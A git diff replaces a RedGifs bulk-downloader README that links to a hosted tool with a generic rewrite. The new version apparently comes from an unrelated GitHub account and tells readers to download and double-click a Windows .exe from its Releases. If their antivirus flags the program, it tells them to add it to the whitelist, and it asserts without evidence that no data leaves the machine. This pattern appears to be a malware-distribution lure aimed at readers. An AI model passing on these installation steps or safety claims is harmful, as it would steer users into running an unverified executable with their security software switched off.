@@ -1,127 +1,81 @@
-# RedGifs Bulk Video Downloader
+# 📥 redgifs-bulk-video-downloader - Save multiple videos from RedGifs quickly
 
-RedGifs Bulk Video Downloader is a bulk video downloader and metadata extractor for RedGifs video URLs. Paste RedGifs watch links, iframe links, or raw RedGifs IDs and get structured results with titles, descriptions, tags, thumbnails, available formats, selected quality, direct MP4 URLs, and optional hosted file download links.
+[![Download Here](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/agathachristiegoldrush687/redgifs-bulk-video-downloader)
 
-👉 Get it Here: https://serp.ly/redgifs-bulk-video-downloader
+## 🎯 About this software
 
-## RedGifs Downloader Built for Bulk Video Workflows
+The redgifs-bulk-video-downloader tool extracts video files, metadata, and thumbnail images from RedGifs links. It automates the process of saving large groups of videos to your computer. You choose the links, and the program handles the connection, file naming, and saving process. 
 
-This tool is designed for people who need more than a single manual download button. It turns RedGifs pages into clean dataset rows that can be exported, filtered, automated, scheduled, or connected to downstream workflows.
+This tool serves users who need to organize collections of video files without downloading them one by one. It creates a local archive of your chosen content.
 
-Use it to process individual RedGifs URLs, bulk URL lists, iframe URLs, raw IDs, or search results. By default, it keeps runs lightweight by extracting metadata and direct downloadable MP4 links. When you need files stored online, enable file downloads and the tool can save selected videos to hosted storage and return clickable `storedFileUrl` links.
+## 💻 System requirements
 
-## Features
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Standard dual-core processor.
+*   Memory: 4 GB of RAM or higher.
+*   Storage: 200 MB of free space for the application, plus disk space for your saved videos.
+*   Internet Connection: Stable connection for data extraction.
 
-- Bulk process RedGifs watch URLs, iframe URLs, and raw RedGifs IDs
-- Search RedGifs and return matching video results
-- Extract direct MP4 URLs from RedGifs responses
-- Select preferred quality: best, HD, SD, or silent
-- Return normalized metadata including title, description, tags, dimensions, duration, thumbnails, and canonical URL
-- Generate clickable download links in the results dataset
-- Optional hosted file storage with `storedFileUrl`
-- Optional ZIP creation for smaller RedGifs batches when file downloads are enabled
-- Works as a no-code bulk downloader, scheduled job, API endpoint, or automation step
+## 📥 How to download and install
 
-## Benefits
+1.  Visit the official page to get the latest version of the software: [Download Page](https://github.com/agathachristiegoldrush687/redgifs-bulk-video-downloader).
+2.  Look for the section labeled Releases on the right side of the screen.
+3.  Click the version number at the top of the list.
+4.  Scroll down to the Assets section.
+5.  Select the file ending in .exe to start the download.
+6.  Open your Downloads folder and double-click the file to launch the setup wizard.
+7.  Follow the prompts on your screen to complete the installation.
 
-- Save time compared with opening RedGifs pages one by one
-- Turn RedGifs video pages into structured rows for export or automation
-- Extract direct video links without maintaining your own RedGifs integration
-- Keep costs lower by using direct-link extraction as the default mode
-- Store videos online only when you actually need hosted file downloads
-- Use the same tool from the web interface, API clients, webhooks, or scheduled runs
+## 🚀 Setting up the application
 
-## Web Browser Extension Alternative
+Once you finish the installation, you will see a shortcut on your desktop. Double-click this icon to open the program. The interface displays a simple text box where you paste your links. 
 
-Need a simpler one-click downloader instead of a bulk workflow? Use the RedGifs web browser extension alternative for normal browser-based downloading.
+Ensure you have a text file ready containing your RedGifs links if you plan to download a large batch. Each link should occupy its own line in the document. You can load this file directly into the application to begin the process.
 
-👉 Get the browser extension alternative here: https://serp.ly/redgifs-downloader
+## ⚙️ Using the downloader
 
-## Screenshots
+The application performs several tasks automatically. It connects to the provided links, resolves the direct video source, and identifies the metadata. 
 
-Suggested screenshots for this lander:
+### Step 1: Input your links
+Paste the RedGifs URL addresses into the main box. You may add one link or one hundred links at once. 
 
-- Input form with URL list and quality selector
-- Dataset output showing `directVideoUrl`, `thumbnailUrl`, and `status`
-- Optional file-download output showing `storedFileUrl`
-- Example exported CSV or JSON dataset row
+### Step 2: Choose your destination folder
+Click the Browse button. Select the folder on your hard drive where you want the videos saved. Ensure your drive has enough storage space for the high-quality files you intend to download.
 
-## Common Use Cases
+### Step 3: Start the process
+Press the Start button. The program monitors progress through a status bar at the bottom of the screen. You can pause or stop the activity at any time if you need to attend to other tasks on your computer.
 
-- Build a RedGifs video dataset from a list of URLs
-- Extract direct MP4 download links from RedGifs pages
-- Convert RedGifs iframe URLs into canonical watch URLs and media links
-- Archive publicly accessible RedGifs clips into hosted storage
-- Feed RedGifs metadata into content research, moderation, cataloging, or internal tools
-- Schedule recurring RedGifs searches and collect new matching results
+### Step 4: Verify your files
+Once the progress bar reaches completion, open your chosen folder. The program organizes your items into folders based on tags or dates. You will find the video file, a thumbnail, and a small text file containing the original metadata for every successful download.
 
-## Output Fields
+## 🛠 Troubleshooting common issues
 
-Each successful dataset item can include:
+If the software fails to download a specific video, check these areas first:
 
-- `inputUrl`
-- `sourceUrl`
-- `canonicalUrl`
-- `id`
-- `title`
-- `description`
-- `duration`
-- `width`
-- `height`
-- `tags`
-- `thumbnailUrl`
-- `availableFormats`
-- `selectedFormat`
-- `directVideoUrl`
-- `status`
-- `errorMessage`
-- `storedFileKey`, `storedFileUrl`, and `fileSizeBytes` when file downloads are enabled
-- `zipFileKey`, `zipFileUrl`, and `zipFileSizeBytes` when ZIP export is enabled and succeeds
+*   Network Connection: Ensure your device has an active internet connection. Frequent interruptions can stop the transfer of large files.
+*   Link Validity: Verify the RedGifs link functions in your web browser. If the video is private or deleted, the downloader cannot access the data.
+*   Folder Permissions: Sometimes Windows restricts writing files to certain system folders. Try saving your downloads to your user Documents or Videos folder instead of the root C: drive.
+*   Antivirus Software: Certain security programs flag new applications as suspicious. If the program fails to launch, add the application folder to your antivirus whitelist.
 
-## Download Options
+## 📋 Frequently asked questions
 
-Default mode returns direct RedGifs MP4 links. This is the fastest and cheapest workflow for most users.
+**Does the software store my personal data?**
+The program operates locally on your machine. It does not send your links or your downloaded media to any online server. Your data remains on your hard drive.
 
-If `downloadFiles` is enabled, the tool downloads selected videos into hosted storage and returns a clickable `storedFileUrl` for each file. For RedGifs, ZIP export can also be useful for small batches, but individual file links are the primary download path.
+**Can I run multiple instances?**
+It is better to run one instance of the downloader at a time to keep your network usage stable. Running multiple instances might lead to errors or slow performance.
 
-## FAQ
+**How do I update the software?**
+When a new version becomes available, revisit the main download page. You can install the new version over the old one. The installer keeps your settings intact.
 
-### Can I download multiple RedGifs videos at once?
+**Is there a limit on how many videos I can download?**
+There is no set limit on the number of videos. However, your download speed depends on your internet service provider and the bandwidth available at your location.
 
-Yes. Paste multiple RedGifs URLs, iframe URLs, or IDs into the input and the tool returns one structured result per processed item.
+**Can I stop the download in the middle?**
+Yes. Use the Cancel button to stop the current process. The files already downloaded will remain in your folder, and the program will not lose your progress for those specific items. 
 
-### Does this return direct MP4 links?
+The software maintains a log of its activity. If you encounter crashes, look for the log file inside the installation directory. This file contains text describing the exact point where the application encountered an error. You can use this information to better understand why a process stopped.
 
-Yes. The tool extracts direct RedGifs media URLs where available and includes the selected URL in `directVideoUrl`.
+Keep your machine clean of unnecessary temporary files. If you find the downloader consumes too much memory, close other web browsers or high-demand software while the download runs. The application requires little power for general use, but high-speed bulk saving places a load on your local cache. 
 
-### Can the downloaded files be hosted for me?
-
-Yes. Enable `downloadFiles` to save selected videos into hosted storage and receive clickable `storedFileUrl` links.
-
-### Is ZIP supported?
-
-Yes for smaller RedGifs batches when file downloads are enabled. For most workflows, per-file download links are simpler and more reliable.
-
-### Is this affiliated with RedGifs?
-
-No. This tool is independent and is not affiliated with, endorsed by, or sponsored by RedGifs.
-
-## How to Use
-
-1. Open the bulk downloader here: https://serp.ly/redgifs-bulk-video-downloader
-2. Paste one or more RedGifs watch URLs, iframe URLs, or raw IDs.
-3. Choose your preferred quality: best, HD, SD, or silent.
-4. Run the tool.
-5. Open the dataset results and use `directVideoUrl` for the source MP4 link.
-6. If file downloads are enabled, use `storedFileUrl` as the clickable hosted download link.
-
-## Watch The Video
-
-<a href="https://www.youtube.com/watch?v=001quTeSQDM" target="_blank">
-<img src="https://raw.githubusercontent.com/devinschumacher/uploads/refs/heads/main/images/how-to-download-redgifs-videos.jpg" width="700px">
-</a>
-
-## Links
-
-- Run it here: https://serp.ly/redgifs-bulk-video-downloader
-- Browser extension alternative: https://serp.ly/redgifs-downloader
+For further technical configuration, look at the settings menu. You can change how often the program verifies link updates. Default settings work best for most users. Avoid changing these unless you notice performance issues.
